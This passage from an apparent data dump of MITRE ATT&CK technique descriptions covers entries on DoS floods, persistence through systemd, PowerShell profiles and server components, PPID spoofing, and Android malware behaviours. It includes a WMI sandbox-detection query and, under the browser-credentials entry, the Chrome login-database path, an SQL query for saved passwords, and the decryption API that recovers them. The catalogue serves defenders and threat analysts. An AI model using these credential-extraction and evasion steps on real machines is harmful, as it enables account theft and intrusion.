                          '<code>$q = “Select * from Win32_Fan” Get-WmiObject -Query $q</code>. If the results of the '
                          'WMI query return more than zero elements, this might tell them that the machine is a '
                          'physical one. (Citation: Unit 42 OilRig Sept 2018)',
           'name': 'Virtualization/Sandbox Evasion',
           'platforms': ['Windows', 'macOS']},
 'T1498': {'attack_id': 'T1498',
           'categories': ['impact'],
           'description': 'Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the '
                          'availability of targeted resources to users. Network DoS can be performed by exhausting the '
                          'network bandwidth services rely on. Example resources include specific websites, email '
                          'services, DNS, and web-based applications. Adversaries have been observed conducting '
                          'network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February '
                          '2016) and to support other malicious activities, including distraction(Citation: FSISAC '
                          'FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October '
                          '2014)\n'
                          '\n'
                          'A Network DoS will occur when the bandwidth capacity of the network connection to a system '
                          'is exhausted due to the volume of malicious traffic directed at the resource or the network '
                          'connections and network devices the resource relies on. For example, an adversary may send '
                          '10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the '
                          'internet. This traffic can be generated by a single system or multiple systems spread '
                          'across the internet, which is commonly referred to as a distributed DoS (DDoS). Many '
                          'different methods to accomplish such network saturation have been observed, but most fall '
                          'into two main categories: Direct Network Floods and Reflection Amplification.\n'
                          '\n'
                          'To perform Network DoS attacks several aspects apply to multiple methods, including IP '
                          'address spoofing, and botnets.\n'
                          '\n'
                          'Adversaries may use the original IP address of an attacking system, or spoof the source IP '
                          'address to make the attack traffic more difficult to trace back to the attacking system or '
                          'to enable reflection. This can increase the difficulty defenders have in defending against '
                          'the attack by reducing or eliminating the effectiveness of filtering by the source address '
                          'on network defense devices.\n'
                          '\n'
                          'Botnets are commonly used to conduct DDoS attacks against networks and services. Large '
                          'botnets can generate a significant amount of traffic from systems spread across the global '
                          'internet. Adversaries may have the resources to build out and control their own botnet '
                          'infrastructure or may rent time on an existing botnet to conduct an attack. In some of the '
                          'worst cases for DDoS, so many systems are used to generate the flood that each one only '
                          'needs to send out a small amount of traffic to produce enough volume to saturate the target '
                          'network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes '
                          'exceedingly difficult. Botnets have been used in some of the most high-profile DDoS '
                          'attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: '
                          'USNYAG IranianBotnet March 2016)\n'
                          '\n'
                          'For DoS attacks targeting the hosting system directly, see [Endpoint Denial of '
                          'Service](https://attack.mitre.org/techniques/T1499).\n'
                          '\n'
                          '###Direct Network Flood###\n'
                          '\n'
                          'Direct Network Floods are when one or more systems are used to send a high-volume of '
                          "network packets towards the targeted service's network. Almost any network protocol may be "
                          'used for Direct Network Floods. Stateless protocols such as UDP or ICMP are commonly used '
                          'but stateful protocols such as TCP can be used as well.\n'
                          '\n'
                          '###Reflection Amplification###\n'
                          '\n'
                          'Adversaries may amplify the volume of their attack traffic by using Reflection. This type '
                          'of Network DoS takes advantage of a third-party server intermediary that hosts and will '
                          'respond to a given spoofed source IP address. This third-party server is commonly termed a '
                          'reflector. An adversary accomplishes a reflection attack by sending packets to reflectors '
                          'with the spoofed address of the victim. Similar to Direct Network Floods, more than one '
                          'system may be used to conduct the attack, or a botnet may be used. Likewise, one or more '
                          'reflector may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS '
                          'May 2017)\n'
                          '\n'
                          'Reflection attacks often take advantage of protocols with larger responses than requests in '
                          'order to amplify their traffic, commonly known as a Reflection Amplification attack. '
                          'Adversaries may be able to generate an increase in volume of attack traffic that is several '
                          'orders of magnitude greater than the requests sent to the amplifiers. The extent of this '
                          'increase will depending upon many variables, such as the protocol in question, the '
                          'technique used, and the amplifying servers that actually produce the amplification in '
                          'attack volume. Two prominent protocols that have enabled Reflection Amplification Floods '
                          'are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare '
                          'NTPamplifciationDoS), though the use of several others in the wild have been '
                          'documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol '
                          'showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the '
                          'requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)',
           'name': 'Network Denial of Service',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1499': {'attack_id': 'T1499',
           'categories': ['impact'],
           'description': 'Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the '
                          'availability of services to users. Endpoint DoS can be performed by exhausting the system '
                          'resources those services are hosted on or exploiting the system to cause a persistent crash '
                          'condition. Example services include websites, email services, DNS, and web-based '
                          'applications. Adversaries have been observed conducting DoS attacks for political '
                          'purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious '
                          'activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, '
                          'and extortion.(Citation: Symantec DDoS October 2014)\n'
                          '\n'
                          'An Endpoint DoS denies the availability of a service without saturating the network used to '
                          'provide access to the service. Adversaries can target various layers of the application '
                          'stack that is hosted on the system used to provide the service. These layers include the '
                          'Operating Systems (OS), server applications such as web servers, DNS servers, databases, '
                          'and the (typically web-based) applications that sit on top of them. Attacking each layer '
                          'requires different techniques that take advantage of bottlenecks that are unique to the '
                          'respective components. A DoS attack may be generated by a single system or multiple systems '
                          'spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n'
                          '\n'
                          'To perform DoS attacks against endpoint resources, several aspects apply to multiple '
                          'methods, including IP address spoofing and botnets.\n'
                          '\n'
                          'Adversaries may use the original IP address of an attacking system, or spoof the source IP '
                          'address to make the attack traffic more difficult to trace back to the attacking system or '
                          'to enable reflection. This can increase the difficulty defenders have in defending against '
                          'the attack by reducing or eliminating the effectiveness of filtering by the source address '
                          'on network defense devices.\n'
                          '\n'
                          'Botnets are commonly used to conduct DDoS attacks against networks and services. Large '
                          'botnets can generate a significant amount of traffic from systems spread across the global '
                          'internet. Adversaries may have the resources to build out and control their own botnet '
                          'infrastructure or may rent time on an existing botnet to conduct an attack. In some of the '
                          'worst cases for DDoS, so many systems are used to generate requests that each one only '
                          'needs to send out a small amount of traffic to produce enough volume to exhaust the '
                          "target's resources. In such circumstances, distinguishing DDoS traffic from legitimate "
                          'clients becomes exceedingly difficult. Botnets have been used in some of the most '
                          'high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US '
                          'banks.(Citation: USNYAG IranianBotnet March 2016)\n'
                          '\n'
                          'In cases where traffic manipulation is used, there may be points in the the global network '
                          '(such as high traffic gateway routers) where packets can be altered and cause legitimate '
                          'clients to execute code that directs network packets toward a target in high volume. This '
                          'type of capability was previously used for the purposes of web censorship where client HTTP '
                          'traffic was modified to include a reference to JavaScript that generated the DDoS code to '
                          'overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n'
                          '\n'
                          'For attacks attempting to saturate the providing network, see the Network Denial of Service '
                          'Technique [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n'
                          '\n'
                          '### OS Exhaustion Flood\n'
                          'Since operating systems (OSs) are responsible for managing the finite resources on a '
                          'system, they can be a target for DoS. These attacks do not need to exhaust the actual '
                          'resources on a system since they can simply exhaust the limits that an OS self-imposes to '
                          'prevent the entire system from being overwhelmed by excessive demands on its capacity. '
                          'Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN '
                          'floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018)\n'
                          '\n'
                          '#### SYN Flood\n'
                          'With SYN floods excessive amounts of SYN packets are sent, but the 3-way TCP handshake is '
                          'never completed. Because each OS has a maximum number of concurrent TCP connections that it '
                          'will allow, this can quickly exhaust the ability of the system to receive new requests for '
                          'TCP connections, thus preventing access to any TCP service provided by the '
                          'server.(Citation: Cloudflare SynFlood)\n'
                          '\n'
                          '#### ACK Flood\n'
                          'ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are '
                          'sent to the target. This forces the OS to search its state table for a related TCP '
                          'connection that has already been established. Because the ACK packets are for connections '
                          'that do not exist, the OS will have to search the entire state table to confirm that no '
                          'match exists. When it is necessary to do this for a large flood of packets, the '
                          'computational requirements can cause the server to become sluggish and/or unresponsive, due '
                          'to the work it must do to eliminate the rogue ACK packets. This greatly reduces the '
                          'resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)\n'
                          '\n'
                          '### Service Exhaustion Flood\n'
                          'Different network services provided by systems are targeted in different ways to conduct a '
                          'DoS. Adversaries often target DNS and web servers, but other services have been targeted as '
                          'well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through '
                          'a variety of means, some of which apply generally while others are specific to the software '
                          'being used to provide the service.\n'
                          '\n'
                          '#### Simple HTTP Flood\n'
                          'A large number of HTTP requests can be issued to a web server to overwhelm it and/or an '
                          'application that runs on top of it. This flood relies on raw volume to accomplish the '
                          'objective, exhausting any of the various resources required by the victim software to '
                          'provide the service.(Citation: Cloudflare HTTPflood)\n'
                          '\n'
                          '#### SSL Renegotiation Attack\n'
                          'SSL Renegotiation Attacks take advantage of a protocol feature in SSL/TLS. The SSL/TLS '
                          'protocol suite includes mechanisms for the client and server to agree on an encryption '
                          'algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a '
                          'request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, '
                          'the adversary establishes a SSL/TLS connection and then proceeds to make a series of '
                          'renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in '
                          'computation cycles, this can cause an impact to the availability of the service when done '
                          'in volume.(Citation: Arbor SSLDoS April 2012)\n'
                          '\n'
                          '### Application Exhaustion Flood\n'
                          'Web applications that sit on top of web server stacks can be targeted for DoS. Specific '
                          'features in web applications may be highly resource intensive. Repeated requests to those '
                          'features may be able to exhaust resources and deny access to the application or the server '
                          'itself.(Citation: Arbor AnnualDoSreport Jan 2018)\n'
                          '\n'
                          '### Application or System Exploitation\n'
                          'Software vulnerabilities exist that when exploited can cause an application or system to '
                          'crash and deny availability to users.(Citation: Sucuri BIND9 August 2015) Some systems may '
                          'automatically restart critical applications and services when crashes occur, but they can '
                          'likely be re-exploited to cause a persistent DoS condition.',
           'name': 'Endpoint Denial of Service',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1500': {'attack_id': 'T1500',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may attempt to make payloads difficult to discover and analyze by delivering '
                          'files to victims as uncompiled code. Similar to [Obfuscated Files or '
                          'Information](https://attack.mitre.org/techniques/T1027), text-based source code files may '
                          'subvert analysis and scrutiny from protections targeting executables/binaries. These '
                          'payloads will need to be compiled before execution; typically via native utilities such as '
                          'csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)\n'
                          '\n'
                          'Source code payloads may also be encrypted, encoded, and/or embedded within other files, '
                          'such as those delivered as a [Spearphishing '
                          'Attachment](https://attack.mitre.org/techniques/T1193). Payloads may also be delivered in '
                          'formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) '
                          'before later being (re)compiled into a proper executable binary with a bundled compiler and '
                          'execution framework.(Citation: TrendMicro WindowsAppMac)\n',
           'name': 'Compile After Delivery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1501': {'attack_id': 'T1501',
           'categories': ['persistence'],
           'description': 'Systemd services can be used to establish persistence on a Linux system. The systemd '
                          'service manager is commonly used for managing background daemon processes (also known as '
                          'services) and other system resources.(Citation: Linux man-pages: systemd January '
                          '2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default '
                          'initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu '
                          '15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and '
                          'Upstart while remaining backwards compatible with the aforementioned init systems.\n'
                          '\n'
                          'Systemd utilizes configuration files known as service units to control how services boot '
                          'and under what conditions. By default, these unit files are stored in the '
                          '<code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and '
                          'have the file extension <code>.service</code>. Each service unit file may contain numerous '
                          'directives that can execute system commands. \n'
                          '\n'
                          '* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a '
                          "services is started manually by 'systemctl' or on system start if the service is set to "
                          'automatically start. \n'
                          '* ExecReload directive covers when a service restarts. \n'
                          '* ExecStop and ExecStopPost directives cover when a service is stopped or manually by '
                          "'systemctl'.\n"
                          '\n'
                          'Adversaries have used systemd functionality to establish persistent access to victim '
                          'systems by creating and/or modifying service unit files that cause systemd to execute '
                          'malicious commands at recurring intervals, such as at system boot.(Citation: Anomali Rocke '
                          'March 2019)(Citation: gist Arch package compromise 10JUL2018)(Citation: Arch Linux Package '
                          'Systemd Compromise BleepingComputer 10JUL2018)(Citation: acroread package compromised Arch '
                          'Linux Mail 8JUL2018)\n'
                          '\n'
                          'While adversaries typically require root privileges to create/modify service unit files in '
                          'the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, '
                          'low privilege users can create/modify service unit files in directories such as '
                          '<code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation: Rapid7 '
                          'Service Persistence 22JUNE2016)',
           'name': 'Systemd Service',
           'platforms': ['Linux']},
 'T1502': {'attack_id': 'T1502',
           'categories': ['defense-evasion', 'privilege-escalation'],
           'description': 'Adversaries may spoof the parent process identifier (PPID) of a new process to evade '
                          'process-monitoring defenses or to elevate privileges. New processes are typically spawned '
                          'directly from their parent, or calling, process unless explicitly specified. One way of '
                          'explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API '
                          'call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens '
                          'SelectMyParent Nov 2009) This functionality is used by Windows features such as User '
                          'Account Control (UAC) to correctly set the PPID after a requested elevated process is '
                          'spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) '
                          'rather than the current user context.(Citation: Microsoft UAC Nov 2018)\n'
                          '\n'
                          'Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes '
                          'spawning directly from Office documents, and analysis targeting unusual/potentially '
                          'malicious parent-child process relationships, such as spoofing the PPID of '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086)/[Rundll32](https://attack.mitre.org/techniques/T1085) '
                          'to be <code>explorer.exe</code> rather than an Office document delivered as part of '
                          '[Spearphishing Attachment](https://attack.mitre.org/techniques/T1193).(Citation: '
                          'CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via VBA '
                          '[Scripting](https://attack.mitre.org/techniques/T1064) within a malicious Office document '
                          'or any code that can perform [Execution through '
                          'API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar '
                          '2019)(Citation: CounterCept PPID Spoofing Dec 2018)\n'
                          '\n'
                          'Explicitly assigning the PPID may also enable [Privilege '
                          'Escalation](https://attack.mitre.org/tactics/TA0004) (given appropriate access rights to '
                          'the parent process). For example, an adversary in a privileged user context (i.e. '
                          'administrator) may spawn a new process and assign the parent as a process running as SYSTEM '
                          '(such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited '
                          'access token.(Citation: XPNSec PPID Nov 2017)',
           'name': 'Parent PID Spoofing',
           'platforms': ['Windows']},
 'T1503': {'attack_id': 'T1503',
           'categories': ['credential-access'],
           'description': 'Adversaries may acquire credentials from web browsers by reading files specific to the '
                          'target browser.  (Citation: Talos Olympic Destroyer 2018) \n'
                          '\n'
                          'Web browsers commonly save credentials such as website usernames and passwords so that they '
                          'do not need to be entered manually in the future. Web browsers typically store the '
                          'credentials in an encrypted format within a credential store; however, methods exist to '
                          'extract plaintext credentials from web browsers.\n'
                          '\n'
                          'For example, on Windows systems, encrypted credentials may be obtained from Google Chrome '
                          'by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login '
                          'Data</code> and executing a SQL query: <code>SELECT action_url, username_value, '
                          'password_value FROM logins;</code>. The plaintext password can then be obtained by passing '
                          'the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, '
                          'which uses the victim’s cached logon credentials as the decryption key. (Citation: '
                          'Microsoft CryptUnprotectData \u200eApril 2018)\n'
                          ' \n'
                          'Adversaries have executed similar procedures for common web browsers such as FireFox, '
                          'Safari, Edge, etc. (Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: '
                          'FireEye HawkEye Malware July 2017)\n'
                          '\n'
                          'Adversaries may also acquire credentials by searching web browser process memory for '
                          'patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n'
                          '\n'
                          'After acquiring credentials from web browsers, adversaries may attempt to recycle the '
                          'credentials across different systems and/or accounts in order to expand access. This can '
                          "result in significantly furthering an adversary's objective in cases where credentials "
                          'gained from web browsers overlap with privileged accounts (e.g. domain administrator).',
           'name': 'Credentials from Web Browsers',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1504': {'attack_id': 'T1504',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Adversaries may gain persistence and elevate privileges in certain situations by abusing '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086) profiles. A PowerShell profile  '
                          '(<code>profile.ps1</code>) is a script that runs when PowerShell starts and can be used as '
                          'a logon script to customize user environments. PowerShell supports several profiles '
                          'depending on the user or host program. For example, there can be different profiles for '
                          'PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio '
                          'Code. An administrator can also configure a profile that applies to all users and host '
                          'programs on the local computer. (Citation: Microsoft About Profiles) \n'
                          '\n'
                          'Adversaries may modify these profiles to include arbitrary commands, functions, modules, '
                          'and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session '
                          'the modified script will be executed unless the <code>-NoProfile</code> flag is used when '
                          'it is launched. (Citation: ESET Turla PowerShell May 2019) \n'
                          '\n'
                          'An adversary may also be able to escalate privileges if a script in a PowerShell profile is '
                          'loaded and executed by an account with higher privileges, such as a domain administrator. '
                          '(Citation: Wits End and Shady PowerShell Profiles)',
           'name': 'PowerShell Profile',
           'platforms': ['Windows']},
 'T1505': {'attack_id': 'T1505',
           'categories': ['persistence'],
           'description': 'Adversaries may abuse legitimate extensible development features of server applications to '
                          'establish persistent access to systems. Enterprise server applications may include features '
                          'that allow application developers to write and install software to extend the functionality '
                          'of the main application. Adversaries may install malicious software components to '
                          'maliciously extend and abuse server applications.\n'
                          '\n'
                          '###Transport Agent\n'
                          'Microsoft Exchange transport agents can operate on email messages passing through the '
                          'transport pipeline to perform various tasks such as filtering spam, filtering malicious '
                          'attachments, journaling, or adding a corporate signature to the end of all outgoing '
                          'emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) '
                          'Transport agents can be written by application developers and then compiled to .NET '
                          'assemblies that are subsequently registered with the Exchange server. Transport agents will '
                          'be invoked during a specified stage of email processing and carry out developer defined '
                          'tasks.\n'
                          '\n'
                          'Adversaries may register a malicious transport agent to provide a persistence mechanism in '
                          'Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET '
                          'LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails '
                          'passing through the Exchange transport pipeline, the agent can be configured to only carry '
                          'out specific tasks in response to adversary defined criteria. For example, the transport '
                          'agent may only carry out an action like copying in-transit attachments and saving them for '
                          'later exfiltration if the recipient email address matches an entry on a list provided by '
                          'the adversary.\n'
                          '\n'
                          '###SQL Stored Procedures\n'
                          'SQL stored procedures are code that can be saved and reused so that database users do not '
                          'waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL '
                          'statements to the database using the procedure name or via defined events (e.g. when a SQL '
                          'server application is started/restarted). Adversaries may craft malicious stored procedures '
                          'that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup '
                          'Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands '
                          'through SQL syntax the adversary may have to enable additional functionality, such as '
                          '<code>xp_cmdshell</code> for MSSQL Server.(Citation: NetSPI Startup Stored '
                          'Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017)\n'
                          '\n'
                          'Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR '
                          'integration enabled, application developers can write stored procedures using any .NET '
                          'framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) '
                          'Adversaries may craft or modify CLR assemblies that are linked to stored procedures, these '
                          'CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR)',
           'name': 'Server Software Component',
           'platforms': ['Windows', 'Linux']},
 'T1506': {'attack_id': 'T1506',
           'categories': ['defense-evasion', 'lateral-movement'],
           'description': 'Adversaries can use stolen session cookies to authenticate to web applications and '
                          'services. This technique bypasses some multi-factor authentication protocols since the '
                          'session is already authenticated.(Citation: Pass The Cookie)\n'
                          '\n'
                          'Authentication cookies are commonly used in web applications, including cloud-based '
                          'services, after a user has authenticated to the service so credentials are not passed and '
                          're-authentication does not need to occur as frequently. Cookies are often valid for an '
                          'extended period of time, even if the web application is not actively used. After the cookie '
                          'is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), '
                          'the adversary then imports the cookie into a browser they control and is able to use the '
                          'site or application as the user for as long as the session cookie is active. Once logged '
                          'into the site, an adversary can access sensitive information, read email, or perform '
                          'actions that the victim account has permissions to perform.\n'
                          '\n'
                          'There have been examples of malware targeting session cookies to bypass multi-factor '
                          'authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019) ',
           'name': 'Web Session Cookie',
           'platforms': ['Office 365', 'SaaS']},
 'T1507': {'attack_id': 'T1507',
           'categories': ['collection'],
           'description': 'Adversaries may use device sensors to collect information about nearby networks, such as '
                          'Wi-Fi and Bluetooth.',
           'name': 'Network Information Discovery',
           'platforms': ['Android']},
 'T1508': {'attack_id': 'T1508',
           'categories': ['defense-evasion'],
           'description': 'A malicious application could suppress its icon from being displayed to the user in the '
                          'application launcher to hide the fact that it is installed, and to make it more difficult '
                          "for the user to uninstall the application. Hiding the application's icon programmatically "
                          'does not require any special permissions.\n'
                          '\n'
                          'This behavior has been seen in the BankBot/Spy Banker and SimBad families of '
                          'malware.(Citation: android-trojan-steals-paypal-2fa)(Citation: '
                          'sunny-stolen-credentials)(Citation: bankbot-spybanker)(Citation: simbad-adware)',
           'name': 'Suppress Application Icon',
           'platforms': ['Android']},
 'T1509': {'attack_id': 'T1509',
           'categories': ['command-and-control'],
           'description': 'Adversaries may use non-standard ports to exfiltrate information.',
           'name': 'Uncommonly Used Port',
           'platforms': ['Android', 'iOS']},
 'T1510': {'attack_id': 'T1510',
           'categories': ['impact'],
           'description': 'Adversaries may abuse clipboard functionality to intercept and replace information in the '
                          'Android device clipboard.(Citation: ESET Clipboard Modification February 2019)(Citation: '
                          'Welivesecurity Clipboard Modification February 2019)(Citation: Syracuse Clipboard '
                          'Modification 2014) Malicious applications may monitor the clipboard activity through the '
                          '<code>ClipboardManager.OnPrimaryClipChangedListener</code> interface on Android to '
                          'determine when the clipboard contents have changed.(Citation: Dr.Webb Clipboard '
                          'Modification origin2 August 2018)(Citation: Dr.Webb Clipboard Modification origin August '
                          '2018) Listening to clipboard activity, reading the clipboard contents, and modifying the '
                          'clipboard contents requires no explicit application permissions and can be performed by '
                          'applications running in the background, however, this behavior has changed with the release '
                          'of Android 10.(Citation: Android 10 Privacy Changes)\n'
                          '\n'
                          'Adversaries may use [Clipboard Modification](https://attack.mitre.org/techniques/T1510) to '
                          'replace text prior to being pasted, for example, replacing a copied Bitcoin wallet address '
                          'with a wallet address that is under adversarial control.\n'
                          '\n'
                          '[Clipboard Modification](https://attack.mitre.org/techniques/T1510) had been seen within '
                          'the Android/Clipper.C trojan. This sample had been detected by ESET in an application '
                          'distributed through the Google Play Store targeting cryptocurrency wallet '
                          'numbers.(Citation: ESET Clipboard Modification February 2019)',
           'name': 'Clipboard Modification',
           'platforms': ['Android']},
 'T1512': {'attack_id': 'T1512',
           'categories': ['collection'],
           'description': 'Adversaries may utilize the camera to capture information about the user, their '
                          'surroundings, or other physical identifiers. Adversaries may use the physical camera '
                          'devices on a mobile device to capture images or video. By default, in Android and iOS, an '
                          'application must request permission to access a camera device which is granted by the user '
                          'through a request prompt. In Android, applications must hold the '
                          '`android.permission.CAMERA` permission to access the camera. In iOS, applications must '
                          'include the `NSCameraUsageDescription` key in the `Info.plist` file, and must request '
                          'access to the camera at runtime.',
           'name': 'Capture Camera',
           'platforms': ['Android', 'iOS']},
 'T1513': {'attack_id': 'T1513',
           'categories': ['collection'],
           'description': 'Adversaries may use screen captures to collect information about applications running in '
                          'the foreground, capture user data, credentials, or other sensitive information. '
                          'Applications running in the background can capture screenshots or videos of another '
                          'application running in the foreground by using the Android `MediaProjectionManager` '
                          '(generally requires the device user to grant consent).(Citation: Fortinet screencap July '
                          '2019)(Citation: Android ScreenCap1 2019) Background applications can also use Android '
                          'accessibility services to capture screen contents being displayed by a foreground '
                          'application.(Citation: Lookout-Monokle) An adversary with root access or Android Debug '
                          'Bridge (adb) access could call the Android `screencap` or `screenrecord` '
                          'commands.(Citation: Android ScreenCap2 2019)(Citation: Trend Micro ScreenCap July 2015)',
           'name': 'Screen Capture',
           'platforms': ['Android']},
 'T1514': {'attack_id': 'T1514',
           'categories': ['privilege-escalation'],
           'description': 'Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges '
                          'by prompting the user for credentials.(Citation: AppleDocs '
                          'AuthorizationExecuteWithPrivileges) The purpose of this API is to give application '
                          'developers an easy way to perform operations with root privileges, such as for application '
                          'installation or updating.  This API does not validate that the program requesting root '
                          'privileges comes from a reputable source or has been maliciously modified. Although this '
                          'API is deprecated, it still fully functions in the latest releases of macOS. When calling '
                          'this API, the user will be prompted to enter their credentials but no checks on the origin '
                          'or integrity of the program are made. The program calling the API may also load world '
                          'writable files which can be modified to perform malicious behavior with elevated '
                          'privileges.\n'
                          '\n'
                          'Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order '
                          'to install malicious software on victims and install persistence mechanisms.(Citation: '
                          "Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb "
                          '2019)(Citation: OSX Coldroot RAT) This technique may be combined with '
                          '[Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting '
                          "escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all "
                          'broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to '
                          'work by modifying legitimate programs present on the machine that make use of this '
                          "API.(Citation: Death by 1000 installers; it's all broken!)",
           'name': 'Elevated Execution with Prompt',
           'platforms': ['macOS']},
 'T1516': {'attack_id': 'T1516',
           'categories': ['defense-evasion', 'impact'],
           'description': 'A malicious application can inject input to the user interface to mimic user interaction '
                          "through the abuse of Android's accessibility APIs.\n"
                          '\n'
                          '[Input Injection](https://attack.mitre.org/techniques/T1516) can be achieved using any of '
                          'the following methods:\n'
                          '\n'
                          "* Mimicking user clicks on the screen, for example to steal money from a user's PayPal "
                          'account.(Citation: android-trojan-steals-paypal-2fa)\n'
                          '* Injecting global actions, such as `GLOBAL_ACTION_BACK` (programatically mimicking a '
                          'physical back button press), to trigger actions on behalf of the user.(Citation: Talos '
                          'Gustuff Apr 2019)\n'
                          '* Inserting input into text fields on behalf of the user. This method is used legitimately '
                          'to auto-fill text fields by applications such as password managers.(Citation: bitwarden '
                          'autofill logins)',
           'name': 'Input Injection',
           'platforms': ['Android']},
 'T1517': {'attack_id': 'T1517',
           'categories': ['collection', 'credential-access'],
           'description': 'A malicious application can read notifications sent by the operating system or other '
                          'applications, which may contain sensitive data such as one-time authentication codes sent '
                          'over SMS, email, or other mediums. A malicious application can also dismiss notifications '
                          'to prevent the user from noticing that the notifications arrived and can trigger action '
                          'buttons contained within notifications.(Citation: ESET 2FA Bypass)',
           'name': 'Access Notifications',
           'platforms': ['Android']},
 'T1518': {'attack_id': 'T1518',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get a listing of non-security related software that is installed '
                          'on the system. Adversaries may use the information from [Software '
                          'Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape '
                          'follow-on behaviors, including whether or not the adversary fully infects the target and/or '
                          'attempts specific actions.',
           'name': 'Software Discovery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1519': {'attack_id': 'T1519',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Adversaries may use Event Monitor Daemon (emond) to establish persistence by scheduling '
                          'malicious commands to run on predictable event triggers. Emond is a [Launch '
                          'Daemon](https://attack.mitre.org/techniques/T1160) that accepts events from various '
                          'services, runs them through a simple rules engine, and takes action. The emond binary at '
                          '<code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> '
                          'directory and take action once an explicitly defined event takes place. The rule files are '
                          'in the plist format and define the name, event type, and action to take. Some examples of '
                          'event types include system startup and user authentication. Examples of actions are to run '
                          'a system command or send an email. The emond service will not launch if there is no file '
                          'present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified '
                          'in the [Launch Daemon](https://attack.mitre.org/techniques/T1160) configuration file '
                          'at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond '
                          'Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun '
                          '2019)\n'
                          '\n'
                          'Adversaries may abuse this service by writing a rule to execute commands when a defined '
                          'event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan '
                          '2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) '
                          'Adversaries may also be able to escalate privileges from administrator to root as the emond '
                          'service is executed with root privileges by the [Launch '
                          'Daemon](https://attack.mitre.org/techniques/T1160) service.',
           'name': 'Emond',
           'platforms': ['macOS']},
 'T1520': {'attack_id': 'T1520',
           'categories': ['command-and-control'],
           'description': 'Adversaries may use [Domain Generation '
                          'Algorithms](https://attack.mitre.org/techniques/T1520) (DGAs) to procedurally generate '
